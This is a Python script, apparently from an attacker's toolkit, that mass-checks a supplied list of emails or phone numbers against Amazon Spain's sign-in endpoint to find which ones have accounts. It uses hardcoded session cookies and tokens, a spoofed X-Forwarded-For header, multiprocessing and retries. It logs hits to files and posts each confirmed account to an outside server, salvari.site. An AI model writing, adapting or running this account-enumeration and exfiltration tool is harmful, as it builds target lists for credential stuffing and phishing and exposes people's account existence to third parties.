import requests
from multiprocessing import Pool
import time

requests.packages.urllib3.disable_warnings()

class Amazon:
    def __init__(self, num):
        self.url = "https://www.amazon.es/ap/signin"
        self.num = num

    def check(self):
        cookies = {
            "session-id": "262-3412098-5553731",
            "session-id-time": "2350698741l",
            "i18n-prefs": "EUR",
            "csm-hit": "tb:VW6PKDBVQTVB974CKPF2+b-JXHTJ1D0E7YWM7PYCN6T|1719978741942&t:1719978741942&adb:adblk_no",
            "ubid-acbes": "257-5600666-5437402",
            "session-token": "rL6OlMCfH/CVV8ITOq0uTVvFjeAy0LWndYPvD25UE+zdIGzr1e2885aI+ss8Wqti+V9YXJ08Z3fw0qGupuZM1IbDIWAJxtQ7QB40zcA8Vkpbkf17sOjM+jgV8r5RDGgofiXzDXf9sHx/jI+hrRqtP1+W+DufIb8S9KfhQhq3erEp7X/jH0Ncv+ORkzqmlfw0Mw00wBrkSmOVnPEdvLvr6BTyqknWVq8rRKAlvFxryGAv3okzD9mfKuWcQ0gEEOCGx3pSp6QhyMeVXVh9TjWgtV/+1jiytqx9SqblWZFum5vbzkY4WnGrfNlOlLksQFmeIx7pi+aY2gN20OAiEDWm32ro/B0rDUeY"
        }
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "DNT": "1",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://www.amazon.es",
            "Connection": "close",
            "X-Forwarded-For": "127.0.0.1",
            "Referer": "https://www.amazon.es/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.es%2F%3Fref_%3Dnav_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=esflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-User": "?1"
        }
        data = {
            "appActionToken": "yV340cj2F4OzHH0sy9RZOV0huWefIj3D",
            "appAction": "SIGNIN_PWD_COLLECT",
            "subPageType": "SignInClaimCollect",
            "openid.return_to": "ape:aHR0cHM6Ly93d3cuYW1hem9uLmVzLz9yZWZfPW5hdl9zaWduaW4=",
            "prevRID": "ape:M0JTNUI3SjJDSkZXSFNWQ044SE4=",
            "workflowState": "eyJ6aXAiOiJERUYiLCJlbmMiOiJBMjU2R0NNIiwiYWxnIjoiQTI1NktXIn0.qu8hDbu5nKbNF_Ks63wN3o4FuM6PtIWSp2yqES3NiUNrQW0_VQdIaw.ocJ08hy0PvUAWt85.Pga9ZYpRwV_5_oUdBKamu7-RfF1MxAdyQAf00Lrx0jxlwk0-V5rVFZ_hLujQC2G2kehO4FWyOxG3u9BwOf9M6_yUXwWsX5PrHQ7YO-YFgShukiTmPduxSdqw2bdm3cn7uDY5l4gXhGfbe07nmS9opk6penYiRYltjPgpTLJ2-kMeWiFEkRdcufDv0YiZ2Mel4xGoDxpb_xY-9NdlYQVDvPr7rOuXtsC2uvomERzNFKpSSK9Cejte-XYcd90wVPsvwsJ1M27jfua5emAb0ju8q1pC9Zkd0SZFfcnhidIc377W18zwVzGY7F2sXRSv7rI0I4oP.pDlPEODu4Oq0AZBddtQ9oA",
            "email": self.num,
            "password": '',
            "create": "0",
            "metadata1": "ECdITeCs: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"
        }

        try:
            res = requests.post(self.url, headers=headers, cookies=cookies, data=data, timeout=10)
            res.raise_for_status()
            response_text = res.text

            if "ap_change_login_claim" in response_text:
                return True, response_text
            elif "There was a problem" in response_text:
                return False, response_text
            else:
                return False, response_text
        except requests.RequestException as e:
            print(f"Request failed for {self.num}: {e}")
            return None, str(e)

def fun_action(num):
    num = num.strip()
    if num.isnumeric() and "+" not in num:
        num = "%s" % num
    elif "@" in num:
        pass
    else:
        pass

    retries = 3
    for attempt in range(retries):
        success, response = Amazon(num).check()
        if success is not None:
            if success:
                with open("VAMANEW.txt", "a") as ff:
                    ff.write("%s\n" % num)
                print("[+] Yes ==> %s" % num)
                send_to_php(num)
                return "[+] Yes ==> %s" % num
            else:
                with open("FARAAMA.txt", "a") as ff:
                    ff.write("%s\n" % num)
                print("[-] No ==> %s" % num)
                return "[-] No ==> %s" % num
            break
        else:
            print(f"Retrying {num} ({attempt + 1}/{retries})...")
            time.sleep(2)  # Wait for 2 seconds before retrying
    else:
        print(f"Failed to verify {num} after {retries} attempts.")
        return f"Failed to verify {num} after {retries} attempts."

def send_to_php(email):
    url = "https://salvari.site/ama/save.php"
    data = {
        'email': email
    }
    try:
        response = requests.post(url, data=data)
        response.raise_for_status()
    except requests.RequestException as e:
        print(f"Failed to send data to PHP: {e}")

def recheck_invalid_emails():
    with open("FARAAMA.txt", "r") as f:
        invalid_emails = f.read().splitlines()

    with open("FARAAMA.txt", "w") as f:
        f.write("")  # Clear the file

    for email in invalid_emails:
        fun_action(email)

def print_intro():
    print("""
    
Cel mai bun mod de a-ți prezice viitorul este să-l creezi. - 
    Veți reuși pentru că majoritatea oamenilor sunt leneși.
            By MIB
    
    """)

def main():
    email_list = input("[-] List Name : ")
    with open(email_list, "r", encoding="Latin-1") as f:
        emails = f.read().splitlines()
    ThreadPool = Pool(15)
    ThreadPool.map(fun_action, emails)
    # Recheck invalid emails
    recheck_invalid_emails()

if __name__ == "__main__":
    print_intro()
    main()